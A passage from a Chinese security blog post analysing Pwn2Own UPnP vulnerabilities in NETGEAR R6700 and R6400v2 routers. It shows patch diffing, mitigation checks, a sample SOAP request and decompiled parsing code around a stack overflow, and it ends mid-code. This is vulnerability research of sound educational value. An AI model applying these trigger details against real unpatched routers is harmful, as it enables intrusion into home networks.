<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/uploads/favicon_16.ico"><link rel="icon" type="image/png" sizes="16x16" href="/uploads/favicon_16.ico"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta name="google-site-verification" content="0d4t_hprsM6xsQKeGeYaBnGc8q8SZms2YKwT0JV7R1A"><meta name="msvalidate.01" content="FC470CF968AE82F56A6EF54706074EF7"><meta name="baidu-site-verification" content="yFjlb3QBTm"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous"><script class="next-config" data-name="main" type="application/json">{"hostname":"cq674350529.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.12.3","exturl":true,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script><meta name="description" content="前言6月15日，ZDI发布了有关NETGEAR R6700型号路由器的10个0 day的安全公告，其中有2个关于UPnP的漏洞：认证绕过和缓冲区溢出。通过组合这2个漏洞，在Pwn2Own Tokyo 2019比赛中，来自Team Flashback的安全研究员Pedro Ribeiro和Radek Domanski成功在R6700v3设备上实现代码执行。 6月17日，NETGEAR官方发布了安全公"><meta property="og:type" content="article"><meta property="og:title" content="Pwn2Own Netgear R6700 UPnP漏洞分析"><meta property="og:url" content="https://cq674350529.github.io/2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html"><meta property="og:site_name" content="cq674350529&#39;s blog"><meta property="og:description" content="前言6月15日，ZDI发布了有关NETGEAR R6700型号路由器的10个0 day的安全公告，其中有2个关于UPnP的漏洞：认证绕过和缓冲区溢出。通过组合这2个漏洞，在Pwn2Own Tokyo 2019比赛中，来自Team Flashback的安全研究员Pedro Ribeiro和Radek Domanski成功在R6700v3设备上实现代码执行。 6月17日，NETGEAR官方发布了安全公"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cq674350529.github.io/2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/upnpd_bindiff.png"><meta property="og:image" content="https://cq674350529.github.io/2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/vuln_func_control_flow.png"><meta property="og:image" content="https://cq674350529.github.io/2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/pseudocode_diff.png"><meta property="og:image" content="https://cq674350529.github.io/2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/vuln_func_call_path.png"><meta property="article:published_time" content="2020-07-04T02:00:00.000Z"><meta property="article:modified_time" content="2020-08-12T14:15:16.000Z"><meta property="article:author" content="cq674350529"><meta property="article:tag" content="netgear"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cq674350529.github.io/2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/upnpd_bindiff.png"><link rel="canonical" href="https://cq674350529.github.io/2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://cq674350529.github.io/2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","path":"2020/07/04/Pwn2Own-Netgear-R6700-UPnP漏洞分析/","title":"Pwn2Own Netgear R6700 UPnP漏洞分析"}</script><script class="next-config" data-name="calendar" type="application/json">""</script><title>Pwn2Own Netgear R6700 UPnP漏洞分析 | cq674350529's blog</title><link rel="dns-prefetch" href="waline-blog-alpha.vercel.app"><noscript><link rel="stylesheet" href="/css/noscript.css"></noscript><link rel="alternate" href="/atom.xml" title="cq674350529's blog" type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage" class="use-motion"><div class="headband"></div><main class="main"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏" role="button"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><i class="logo-line"></i><p class="site-title">cq674350529's blog</p><i class="logo-line"></i></a></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close" role="button"><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class="search-result-icon"><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role="button"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div><aside class="sidebar"><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class="sidebar-nav"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="sidebar-panel-container"><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E6%AF%94%E5%AF%B9"><span class="nav-number">2.</span> <span class="nav-text">补丁比对</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%99%90%E5%88%B6"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SOAP%E6%B6%88%E6%81%AF"><span class="nav-number">4.1.</span> <span class="nav-text">SOAP消息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-number">4.2.</span> <span class="nav-text">缓冲区溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#sa-parseRcvCmd-%E5%87%BD%E6%95%B0"><span class="nav-number">4.2.1.</span> <span class="nav-text">sa_parseRcvCmd()函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sa-processResponse-%E5%87%BD%E6%95%B0"><span class="nav-number">4.2.2.</span> <span class="nav-text">sa_processResponse()函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"><span class="nav-number">4.3.</span> <span class="nav-text">认证绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5"><span class="nav-number">7.</span> <span class="nav-text">相关链接</span></a></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="cq674350529" src="/uploads/avatar_64.jpg"><p class="site-author-name" itemprop="name">cq674350529</p><div class="site-description" itemprop="description">Talk is cheap. Show me the code.</div></div><div class="site-state-wrap site-overview-item animated"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">26</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">5</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">13</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author site-overview-item animated"><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NxNjc0MzUwNTI5" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cq674350529"><i class="fab fa-github fa-fw"></i>GitHub</span> </span><span class="links-of-author-item"><span class="exturl" data-url="bWFpbHRvOmNxNjc0MzUwNTI5QDE2My5jb20=" title="E-Mail → mailto:cq674350529@163.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span> </span><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9jcTY3NDM1MDUyOQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;cq674350529"><i class="fab fa-twitter fa-fw"></i>Twitter</span> </span><span class="links-of-author-item"><a href="https://cq674350529.github.io/atom.xml" title="RSS → https:&#x2F;&#x2F;cq674350529.github.io&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a></span></div><div class="links-of-blogroll site-overview-item animated"><div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i> 推荐</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><span class="exturl" data-url="aHR0cDovL3d3dy5kZXZ0dHlzMC5jb20vYmxvZy8=" title="http:&#x2F;&#x2F;www.devttys0.com&#x2F;blog&#x2F;">/dev/ttyS0</span></li><li class="links-of-blogroll-item"><span class="exturl" data-url="aHR0cHM6Ly9hemVyaWEtbGFicy5jb20vd3JpdGluZy1hcm0tYXNzZW1ibHktcGFydC0xLw==" title="https:&#x2F;&#x2F;azeria-labs.com&#x2F;writing-arm-assembly-part-1&#x2F;">Azeria Labs</span></li><li class="links-of-blogroll-item"><span class="exturl" data-url="aHR0cHM6Ly9vbGQubGl2ZW92ZXJmbG93LmNvbS9pbmRleC5odG1s" title="https:&#x2F;&#x2F;old.liveoverflow.com&#x2F;index.html">LiveOverflow</span></li><li class="links-of-blogroll-item"><span class="exturl" data-url="aHR0cHM6Ly9zY3JpcHRpbmd4c3MuZ2l0Ym9vay5pby9maXJtd2FyZS1zZWN1cml0eS10ZXN0aW5nLW1ldGhvZG9sb2d5Lw==" title="https:&#x2F;&#x2F;scriptingxss.gitbook.io&#x2F;firmware-security-testing-methodology&#x2F;">OWASP FSTM</span></li><li class="links-of-blogroll-item"><span class="exturl" data-url="aHR0cHM6Ly93enQuYWMuY24v" title="https:&#x2F;&#x2F;wzt.ac.cn&#x2F;">CataLpa</span></li></ul></div></div></div></div></aside><div class="sidebar-dimmer"></div></header><div class="back-to-top" role="button" aria-label="返回顶部"><i class="fa fa-arrow-up"></i> <span>0%</span></div><noscript><div class="noscript-warning">Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class="post-block"><article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://cq674350529.github.io/2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/uploads/avatar_64.jpg"><meta itemprop="name" content="cq674350529"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="cq674350529's blog"><meta itemprop="description" content="Talk is cheap. Show me the code."></span><span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork"><meta itemprop="name" content="Pwn2Own Netgear R6700 UPnP漏洞分析 | cq674350529's blog"><meta itemprop="description" content=""></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Pwn2Own Netgear R6700 UPnP漏洞分析</h1><div class="post-meta-container"><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-07-04 10:00:00" itemprop="dateCreated datePublished" datetime="2020-07-04T10:00:00+08:00">2020-07-04</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-08-12 22:15:16" itemprop="dateModified" datetime="2020-08-12T22:15:16+08:00">2020-08-12</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a> </span>， <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">评论：</span> <a title="waline" href="/2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#waline" itemprop="discussionUrl"><span class="post-comments-count waline-comment-count" data-path="/2020/07/04/Pwn2Own-Netgear-R6700-UPnP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="commentCount"></span></a></span></div></div></header><div class="post-body" itemprop="articleBody"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>6月15日，<code>ZDI</code>发布了有关<code>NETGEAR</code> <code>R6700</code>型号路由器的10个<code>0 day</code>的安全公告，其中有2个关于<code>UPnP</code>的漏洞：<span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Fkdmlzb3JpZXMvWkRJLTIwLTcwMy8=">认证绕过<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Fkdmlzb3JpZXMvWkRJLTIwLTcwNC8=">缓冲区溢出<i class="fa fa-external-link-alt"></i></span>。通过组合这2个漏洞，在<code>Pwn2Own Tokyo 2019</code>比赛中，来自<code>Team Flashback</code>的安全研究员<code>Pedro Ribeiro</code>和<code>Radek Domanski</code>成功在<code>R6700v3</code>设备上实现代码执行。</p><p>6月17日，<code>NETGEAR</code>官方发布了<span class="exturl" data-url="aHR0cHM6Ly9rYi5uZXRnZWFyLmNvbS8wMDAwNjE5ODIvU2VjdXJpdHktQWR2aXNvcnktZm9yLU11bHRpcGxlLVZ1bG5lcmFiaWxpdGllcy1vbi1Tb21lLVJvdXRlcnMtTW9iaWxlLVJvdXRlcnMtTW9kZW1zLUdhdGV3YXlzLWFuZC1FeHRlbmRlcnM=">安全公告<i class="fa fa-external-link-alt"></i></span>，并针对<code>R6400v2</code>和<code>R6700v3</code>这2个型号的设备发布了补丁。由于此时还没有这2个漏洞的具体细节，于是打算通过补丁比对的方式对漏洞进行定位和分析。</p><a id="more"></a><h3 id="补丁比对"><a href="#补丁比对" class="headerlink" title="补丁比对"></a>补丁比对</h3><p>选取<code>R6400v2</code>型号作为目标设备，根据<code>NETGEAR</code>官方的安全公告，选取<code>R6400v2-V1.0.4.82</code>和<code>R6400v2-V1.0.4.92</code>两个版本进行比对分析。</p><blockquote><p>当时<code>R6400v2-V1.0.4.92</code>为最新的补丁版本，后来<code>NETGEAR</code>官方对安全公告进行了更新，目前最新的补丁版本为<code>R6400v2-V1.0.4.94</code>。</p></blockquote><p>由于漏洞与<code>UPnP</code>服务有关，于是对<code>upnpd</code>程序进行分析，<code>Bindiff</code>比对的结果如下。</p><img src="images/upnpd_bindiff.png"><p>由图可知，存在差异的重要函数共7个。逐个对函数进行比对和分析，最终定位到<code>sub_00024D80()</code>函数中(补丁版本)。</p><img src="images/vuln_func_control_flow.png"><p>可以看到，在<code>V1.0.4.92</code>补丁版本中，在调用<code>memcpy()</code>之前增加了一个长度校验，很有可能这里就是漏洞修复点。两个函数对应的伪代码如下，在补丁版本中，除了增加对<code>memcpy()</code>长度参数的校验外，<code>sscanf()</code>的格式化参数也发生了变化，可能在调用<code>sscanf()</code>时就会出现溢出。另外，结合该函数中的字符串<code>sa_setBlockName</code>，与<code>ZDI</code>漏洞公告中的描述相符，因此猜测这里就是栈溢出漏洞点。</p><blockquote><p>为了便于阅读，已对部分函数进行了重命名。</p></blockquote><img src="images/pseudocode_diff.png"><p>另外，通过补丁比对的方式，暂时未定位到认证绕过漏洞。</p><h3 id="漏洞利用限制"><a href="#漏洞利用限制" class="headerlink" title="漏洞利用限制"></a>漏洞利用限制</h3><p><code>upnpd</code>程序启用的缓解措施如下：仅启用了<code>NX</code>机制，同时程序的加载基址为<code>0x8000</code>。此外，设备上的<code>ALSR</code>等级为1，且<code>upnpd</code>程序崩溃后并不会重启。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec --file ./usr/sbin/upnpd</span> </span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><p>根据上述信息，在无信息泄露的前提下，要想利用漏洞实现任意代码执行，最大的难题是<code>NULL</code>字符截断的问题。由于<code>upnpd</code>程序中<code>.text</code>段地址的最高字节均为<code>&#39;\x00&#39;</code>，在覆盖返回地址后，后面的payload无法传入，因此只有一次覆盖返回地址的机会。想过尝试利用单次覆盖的机会泄露地址信息，但由于<code>upnpd</code>程序崩溃后不会重启，似乎也不可行。在尝试常规思路无果后，于是求助于<code>Pedro Ribeiro</code>，<code>Pedro Ribeiro</code>表示不便提前透露，但近期会公布漏洞细节。</p><blockquote><p>在其他设备中也遇到过<code>NULL</code>字符截断的问题，故对这个漏洞如何利用更感兴趣，暂时未对调用路径进行详细分析。</p></blockquote><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>6月25日，<code>Pedro Ribeiro</code>在<code>GitHub</code>上公布了<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BlZHJpYi9Qb0MvYmxvYi9kYTMxN2JiYjIyYWJjMmM4OGM4ZmNhZDA2NjhjZGI5NGIyYmEwYTZmL2Fkdmlzb3JpZXMvUHduMk93bi9Ub2t5b18yMDE5L3Rva3lvX2RyaWZ0L3Rva3lvX2RyaWZ0Lm1k">漏洞细节<i class="fa fa-external-link-alt"></i></span>，并告知了我 ( 非常感谢:) )。结合<code>Pedro Ribeiro</code>的<code>write up</code>，加上有了可调试的真实设备，对这两个漏洞的细节有了更进一步的了解。</p><blockquote><p>感兴趣的可以去看一下<code>Pedro Ribeiro</code>的<code>write up</code>，很详细。</p></blockquote><h4 id="SOAP消息"><a href="#SOAP消息" class="headerlink" title="SOAP消息"></a><code>SOAP</code>消息</h4><p><code>upnpd</code>程序会监听<code>5000/tcp</code>端口，其主要通过<code>SOAP</code>协议来进行数据传输，这两个漏洞存在于对应的<code>POST</code>请求中。<code>SOAP</code>是一个基于<code>XML</code>的协议，一条<code>SOAP</code>消息就是一个普通的<code>XML</code>文档，其包含<code>Envelope</code>、<code>Header</code>(可选)、<code>Body</code>和<code>Fault</code>(可选)等元素。针对该设备，一个<code>POST</code>请求示例如下。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 省略部分内容</span><br><span class="line"><span class="keyword">POST</span> <span class="string">soap/server_sa/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">SOAPAction</span>: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">&lt;SOAP-ENV:Body&gt;</span><br><span class="line"><span class="attribute">SetNetgearDeviceName</span></span><br><span class="line"><span class="attribute">&lt;NewBlockSiteName&gt;123456</span></span><br><span class="line"><span class="attribute">&lt;/NewBlockSiteName&gt;</span></span><br><span class="line"><span class="attribute">&lt;/SOAP-ENV:Body&gt;</span></span><br><span class="line"><span class="attribute">&lt;/SOAP-ENV:Envelope&gt;</span></span><br></pre></td></tr></table></figure><h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h4><p>栈溢出漏洞存在于<code>sa_setBlockName()</code>函数内的<code>sscanf()</code>处，漏洞本身比较简单，但还需要对调用路径进行分析看如何触发。在<code>V1.0.4.82</code>版本中，函数<code>sa_setBlockName()</code>的调用路径如下。</p><img src="images/vuln_func_call_path.png" style="zoom:80%"><h5 id="sa-parseRcvCmd-函数"><a href="#sa-parseRcvCmd-函数" class="headerlink" title="sa_parseRcvCmd()函数"></a><code>sa_parseRcvCmd()</code>函数</h5><p>在函数<code>sa_parseRcvCmd()</code>内，需要使得<code>(3)</code>处的条件成立，即<code>v7=0xFF37</code>。<code>(2)</code>处循环及其后面的代码主要是查找标签并返回其索引(类型?)，同时解析标签中的内容，而在<code>(1)</code>处<code>v4</code>指向对应的标签名称表，其部分内容如下。因此，请求数据中需要包含<code>&lt;NewBlockSiteName&gt;</code>标签。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sa_parseRcvCmd</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v2 = <span class="number">0</span>; haystack = a1; v76 = a2; v3 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;:Body&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v82, haystack, <span class="number">0x31</span>u);</span><br><span class="line">  v83 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">702</span>;</span><br><span class="line">  v4 = dword_7DA44;  <span class="comment">// (1) 指向标签名称及索引表</span></span><br><span class="line">  <span class="built_in">memset</span>(dword_D96CC, <span class="number">0</span>, <span class="number">0x5F0</span>u);</span><br><span class="line">  v5 = off_7DA48; v72 = dword_7DA4C;</span><br><span class="line">  <span class="keyword">if</span> ( off_7DA48 == <span class="string">&quot;END_OF_FILE&quot;</span> )</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">  v73 = v3 + <span class="number">6</span>; whence = <span class="number">0</span>; v6 = <span class="number">0</span>; v71 = <span class="number">0</span>; v75 = <span class="number">0</span>; buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )  <span class="comment">// (2) 查找标签,并获取其中的内容</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    v7 = *v4;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)&amp;s, <span class="number">0x32</span>u, <span class="string">&quot;&lt;%s&quot;</span>, v5);</span><br><span class="line">    <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)&amp;v84, <span class="number">0x32</span>u, <span class="string">&quot;&lt;/%s&gt;&quot;</span>, v5);</span><br><span class="line">    v8 = <span class="built_in">strstr</span>(v73, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s);</span><br><span class="line">    <span class="keyword">if</span> ( !v8 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    v9 = <span class="built_in">strchr</span>(v8, <span class="string">&#x27;&gt;&#x27;</span>); v10 = v7 == <span class="number">0xFF3A</span> || v7 == <span class="number">0xFF13</span>;</span><br><span class="line">    src = v9 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 = <span class="built_in">strstr</span>(src, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v84);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    wrap_vprintf(<span class="number">2</span>, <span class="string">&quot;%d, could not found %s\n&quot;</span>, <span class="number">0x4C6</span>, &amp;v84);</span><br><span class="line">LABEL_25:</span><br><span class="line">    <span class="keyword">if</span> ( v4 != &amp;dword_7E368 &amp;&amp; v71 &lt;= <span class="number">19</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="keyword">char</span> *)v4[<span class="number">4</span>]; v17 = v4[<span class="number">5</span>]; v4 += <span class="number">3</span>; v72 = v17;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="string">&quot;END_OF_FILE&quot;</span> )</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="number">0xFF13</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">LABEL_20:</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">0xFF37</span> )  <span 